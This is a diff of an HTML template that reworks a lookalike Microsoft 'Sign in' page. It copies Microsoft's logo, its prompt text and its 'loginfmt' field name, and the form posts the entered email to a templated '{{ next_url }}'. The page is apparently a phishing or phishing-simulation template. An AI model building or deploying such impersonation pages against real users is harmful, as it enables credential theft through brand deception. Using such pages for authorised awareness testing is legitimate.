@@ -5,124 +5,103 @@
     <title>Sign in to your account</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        html, body {
-            height: 100%;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', SegoeUI, 'Helvetica Neue', Arial, sans-serif;
-            background: #f3f2f1;
-        }
-        .outer-container {
+        body {
+            background: linear-gradient(135deg, #f3f6fb 0%, #e9eef6 100%);
             min-height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
             display: flex;
             align-items: center;
             justify-content: center;
-            background: #f3f2f1;
         }
-        .card {
+        .ms-card {
             background: #fff;
-            border-radius: 8px;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.13);
+            border-radius: 12px;
+            box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+            padding: 48px 40px 32px 40px;
             width: 100%;
-            max-width: 400px;
-            padding: 44px 48px 36px 48px;
+            max-width: 360px;
             box-sizing: border-box;
             display: flex;
             flex-direction: column;
-            align-items: stretch;
+            align-items: center;
         }
-        .logo {
-            display: flex;
-            justify-content: flex-start;
-            margin-bottom: 36px;
+        .ms-logo {
+            margin-bottom: 32px;
         }
-        .logo svg {
-            width: 28px;
-            height: 28px;
-        }
-        .title {
+        .ms-title {
             font-size: 24px;
-            font-weight: 400;
+            font-weight: 600;
             color: #1b1b1b;
             margin-bottom: 24px;
+            letter-spacing: -0.5px;
         }
-        .input-label {
-            font-size: 15px;
-            color: #1b1b1b;
-            margin-bottom: 8px;
-            font-weight: 400;
-        }
-        .input {
+        .ms-input {
             width: 100%;
-            padding: 10px 12px;
-            font-size: 15px;
-            border: 1px solid #8a8886;
-            border-radius: 0;
+            padding: 12px 14px;
+            font-size: 16px;
+            border: 1.5px solid #c7c7c7;
+            border-radius: 6px;
             margin-bottom: 24px;
             outline: none;
-            background: #fff;
-            color: #1b1b1b;
-            box-sizing: border-box;
             transition: border-color 0.2s;
         }
-        .input:focus {
+        .ms-input:focus {
             border-color: #0067b8;
         }
-        .btn {
+        .ms-btn {
             width: 100%;
             background: #0067b8;
             color: #fff;
             border: none;
-            border-radius: 0;
-            padding: 10px 0;
-            font-size: 15px;
+            border-radius: 6px;
+            padding: 12px 0;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            margin-bottom: 16px;
             transition: background 0.2s;
+            margin-bottom: 16px;
         }
-        .btn:focus, .btn:hover {
+        .ms-btn:hover, .ms-btn:focus {
             background: #005ba1;
         }
-        .links {
-            display: flex;
-            justify-content: space-between;
-            margin-top: 8px;
-        }
-        .link {
+        .ms-link {
             color: #0067b8;
             text-decoration: none;
-            font-size: 13px;
-            transition: text-decoration 0.2s;
+            font-size: 14px;
+            margin-top: 8px;
+            display: block;
+            text-align: left;
+            width: 100%;
         }
-        .link:focus, .link:hover {
+        .ms-link:focus, .ms-link:hover {
             text-decoration: underline;
         }
         @media (max-width: 480px) {
-            .card {
-                padding: 32px 8vw 24px 8vw;
-                max-width: 100vw;
+            .ms-card {
+                padding: 32px 12px 24px 12px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="outer-container">
-        <main role="main" aria-label="Sign in form" class="card">
-            <div class="logo" aria-label="Microsoft">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" aria-hidden="true"><g><rect fill="#f25022" x="0" y="0" width="10" height="10"/><rect fill="#7fba00" x="14" y="0" width="10" height="10"/><rect fill="#00a4ef" x="0" y="14" width="10" height="10"/><rect fill="#ffb900" x="14" y="14" width="10" height="10"/></g></svg>
-            </div>
-            <div class="title">Sign in</div>
-            <form method="post" action="{{ next_url }}" autocomplete="off">
-                <label for="i0116" class="input-label">Email, phone, or Skype</label>
-                <input id="i0116" class="input" type="text" name="loginfmt" required autofocus autocomplete="username" aria-label="Enter your email, phone, or Skype">
-                <button class="btn" type="submit" id="idSIButton9">Next</button>
-            </form>
-            <div class="links">
-                <a class="link" href="#">Can’t access your account?</a>
-                <a class="link" href="#">Sign-in options</a>
-            </div>
-        </main>
+    <div class="ms-card">
+        <div class="ms-logo">
+            <!-- Microsoft logo SVG -->
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="48" height="48" aria-label="Microsoft logo">
+                <rect width="20" height="20" x="2" y="2" fill="#f25022"/>
+                <rect width="20" height="20" x="26" y="2" fill="#7fba00"/>
+                <rect width="20" height="20" x="2" y="26" fill="#00a4ef"/>
+                <rect width="20" height="20" x="26" y="26" fill="#ffb900"/>
+            </svg>
+        </div>
+        <div class="ms-title">Sign in</div>
+        <form method="post" action="{{ next_url }}" style="width:100%">
+            <input class="ms-input" type="text" name="loginfmt" placeholder="Email, phone, or Skype" required autofocus autocomplete="username">
+            <button class="ms-btn" type="submit">Next</button>
+        </form>
+        <a class="ms-link" href="#">Can’t access your account?</a>
+        <a class="ms-link" href="#">Sign-in options</a>
     </div>
 </body>
 </html>
